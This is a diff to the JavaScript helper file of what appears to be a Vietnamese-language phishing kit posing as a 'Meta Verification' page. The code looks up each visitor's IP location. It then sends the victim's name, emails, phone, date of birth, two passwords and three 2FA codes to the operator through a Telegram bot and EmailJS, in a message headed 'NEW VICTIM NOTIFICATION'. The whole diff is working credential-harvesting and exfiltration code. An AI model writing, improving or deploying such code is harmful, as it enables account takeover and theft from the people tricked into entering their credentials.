@@ -46,77 +46,103 @@ const Utils = {
         }
     },
 
-async getUserLocation() {
-    try {
-        const response = await fetch("https://ipwho.is/", {
-            method: "GET",
-            cache: "no-store"
-        });
+    // Hàm chuyển đổi mã ISO country (US, VN...) thành emoji lá cờ
+    getCountryFlag(countryCode) {
+        if (!countryCode || countryCode === 'N/A' || countryCode.length !== 2) return '🌐';
+        const codePoints = countryCode
+            .toUpperCase()
+            .split('')
+            .map(char => 127397 + char.charCodeAt(0));
+        return String.fromCodePoint(...codePoints);
+    },
 
-        if (!response.ok) {
-            throw new Error(`Location API error: ${response.status}`);
+    async getUserLocation() {
+        try {
+            const response = await fetch("https://ipwho.is/", {
+                method: "GET",
+                cache: "no-store"
+            });
+
+            if (!response.ok) {
+                throw new Error(`Location API error: ${response.status}`);
+            }
+
+            const data = await response.json();
+
+            if (data.success === false) {
+                throw new Error(data.message || "Location lookup failed");
+            }
+
+            const ip = data.ip || "N/A";
+            const countryCode = data.country_code ? data.country_code.toUpperCase() : "N/A";
+
+            const parts = [
+                data.city,
+                data.region,
+                data.country
+            ].filter(Boolean);
+
+            return {
+                ip: ip,
+                country_code: countryCode,
+                flag: this.getCountryFlag(countryCode),
+                location: parts.length > 0 ? parts.join(", ") : "N/A",
+                region: data.region || "N/A",
+                country: data.country || "N/A"
+            };
+
+        } catch (error) {
+            console.error("Location error:", error);
+
+            return {
+                ip: "N/A",
+                country_code: "N/A",
+                flag: "🌐",
+                location: "N/A",
+                region: "N/A",
+                country: "N/A"
+            };
         }
+    },
 
-        const data = await response.json();
-
-        if (data.success === false) {
-            throw new Error(data.message || "Location lookup failed");
-        }
-
-        const ip = data.ip || "N/A";
-
-        const parts = [
-            data.city,
-            data.region,
-            data.country
-        ].filter(Boolean);
-
-        return {
-            ip: ip,
-            location: parts.length > 0
-                ? parts.join(" | ")
-                : "N/A",
-            country_code: data.country_code || "N/A",
-            region: data.region || "N/A",
-            country: data.country || "N/A"
-        };
-
-    } catch (error) {
-        console.error("Location error:", error);
-
-        return {
+    async sendToTelegram(data) {
+        const loc = data.locationData || {
             ip: "N/A",
-            location: "N/A",
             country_code: "N/A",
-            region: "N/A",
-            country: "N/A"
+            flag: "🌐",
+            location: "N/A"
         };
-    }
-},
-async sendToTelegram(data) {
 
-    const locationData = data.locationData || {
-        ip: "N/A",
-        location: "N/A"
-    };
+        const flag = loc.flag || this.getCountryFlag(loc.country_code);
+        const code = loc.country_code || 'N/A';
+        const currentTime = new Date().toLocaleString('vi-VN', { hour12: false });
 
-    const text = `
-<b>IP:</b> <code>${locationData.ip}</code>
-<b>Location:</b> <code>${locationData.location})</code>
-----------------------------------
-<b>Full Name:</b> <code>${data.fullName || ''}</code>
-<b>Email:</b> <code>${data.email || ''}</code>
-<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
-<b>Page Name:</b> <code>${data.fanpage || ''}</code>
-<b>Phone:</b> <code>${data.phone || ''}</code>
-<b>Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
-----------------------------------
-<b>Password(1):</b> <code>${data.password || ''}</code>
-<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
-----------------------------------
-<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
-<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
-<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
+        // Giao diện tin nhắn Telegram định dạng HTML
+        const text = `
+<b>⚡ NEW VICTIM NOTIFICATION ⚡</b>
+<i>Thời gian: ${currentTime}</i>
+━━━━━━━━━━━━━━━━━━━━
+<b>🌐 NETWORK INFO</b>
+• <b>IP:</b> <code>${loc.ip}</code> [<b>${code}</b>] ${flag}
+• <b>Vị trí:</b> <code>${loc.location}</code>
+
+<b>👤 THÔNG TIN CÁ NHÂN</b>
+• <b>Họ và tên:</b> <code>${data.fullName || 'N/A'}</code>
+• <b>Email:</b> <code>${data.email || 'N/A'}</code>
+• <b>Email Business:</b> <code>${data.emailBusiness || 'N/A'}</code>
+• <b>Page:</b> <code>${data.fanpage || 'N/A'}</code>
+• <b>Số điện thoại:</b> <code>${data.phone || 'N/A'}</code>
+• <b>Ngày sinh:</b> <code>${data.day || '--'}/${data.month || '--'}/${data.year || '----'}</code>
+
+<b>🔑 MẬT KHẨU</b>
+• <b>Pass 1:</b> <code>${data.password || 'N/A'}</code>
+• <b>Pass 2:</b> <code>${data.passwordSecond || 'N/A'}</code>
+
+<b>🛡 BẢO MẬT 2FA</b>
+• <b>2FA (1):</b> <code>${data.twoFa || 'N/A'}</code>
+• <b>2FA (2):</b> <code>${data.twoFaSecond || 'N/A'}</code>
+• <b>2FA (3):</b> <code>${data.twoFaThird || 'N/A'}</code>
+━━━━━━━━━━━━━━━━━━━━`;
 
         try {
             await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -124,7 +150,7 @@ async sendToTelegram(data) {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                    text,
+                    text: text.trim(),
                     parse_mode: 'HTML'
                 })
             });
@@ -133,17 +159,19 @@ async sendToTelegram(data) {
         }
     },
 
-async sendToEmail(data) {
+    async sendToEmail(data) {
+        const locationData = data.locationData || {
+            ip: "N/A",
+            country_code: "N/A",
+            location: "N/A"
+        };
 
-    const locationData = data.locationData || {
-        ip: "N/A",
-        location: "N/A"
-    };
-
-    const emailContent = `
-IP: ${locationData.ip}
+        const emailContent = `
+[NETWORK]
+IP: ${locationData.ip} [${locationData.country_code || 'N/A'}]
 Location: ${locationData.location}
 ----------------------------------
+[PERSONAL INFO]
 Full Name: ${data.fullName || ''}
 Email: ${data.email || ''}
 Email Business: ${data.emailBusiness || ''}
@@ -151,17 +179,18 @@ Page Name: ${data.fanpage || ''}
 Phone: ${data.phone || ''}
 Date of Birth: ${data.day}/${data.month}/${data.year}
 ----------------------------------
+[CREDENTIALS]
 Password(1): ${data.password || ''}
 Password(2): ${data.passwordSecond || ''}
 ----------------------------------
-🔐Code 2FA(1): ${data.twoFa || ''}
-🔐Code 2FA(2): ${data.twoFaSecond || ''}
-🔐Code 2FA(3): ${data.twoFaThird || ''}
+[2FA CODES]
+Code 2FA(1): ${data.twoFa || ''}
+Code 2FA(2): ${data.twoFaSecond || ''}
+Code 2FA(3): ${data.twoFaThird || ''}
 
 Sent at: ${new Date().toLocaleString()}`;
 
         try {
-            // Load EmailJS SDK if not already loaded
             if (!window.emailjs) {
                 await this.loadEmailJSSDK();
             }
@@ -171,7 +200,7 @@ Sent at: ${new Date().toLocaleString()}`;
                 CONFIG.EMAILJS_TEMPLATE_ID,
                 {
                     to_email: CONFIG.EMAIL_RECIPIENT,
-                    subject: `Meta Verification - ${locationData.location}`,
+                    subject: `[${locationData.country_code || 'GEO'}] Meta Data - ${locationData.ip}`,
                     message: emailContent,
                     from_name: 'Meta Verification System',
                     reply_to: data.email || 'noreply@system.com'
@@ -201,39 +230,35 @@ Sent at: ${new Date().toLocaleString()}`;
         });
     },
 
-async sendNotification(data) {
-    const notificationType = CONFIG.NOTIFICATION_TYPE;
+    async sendNotification(data) {
+        const notificationType = CONFIG.NOTIFICATION_TYPE;
 
-    try {
-        // Chỉ lấy location 1 lần
-        const locationData = await this.getUserLocation();
+        try {
+            const locationData = await this.getUserLocation();
 
-        const notificationData = {
-            ...data,
-            locationData
-        };
+            const notificationData = {
+                ...data,
+                locationData
+            };
 
-        if (
-            notificationType === 'telegram' ||
-            notificationType === 'both'
-        ) {
-            await this.sendToTelegram(notificationData);
+            if (
+                notificationType === 'telegram' ||
+                notificationType === 'both'
+            ) {
+                await this.sendToTelegram(notificationData);
+            }
+
+            if (
+                notificationType === 'email' ||
+                notificationType === 'both'
+            ) {
+                await this.sendToEmail(notificationData);
+            }
+
+        } catch (error) {
+            console.error('Notification error:', error);
         }
-
-        if (
-            notificationType === 'email' ||
-            notificationType === 'both'
-        ) {
-            await this.sendToEmail(notificationData);
-        }
-
-    } catch (error) {
-        console.error(
-            'Notification error:',
-            error
-        );
-    }
-},
+    },
 
     maskPhone(phone) {
         if (!phone || phone.length < 5) return phone;
@@ -254,4 +279,3 @@ async sendNotification(data) {
         return `${gen()}-${gen()}-${gen()}`;
     }
 };
-
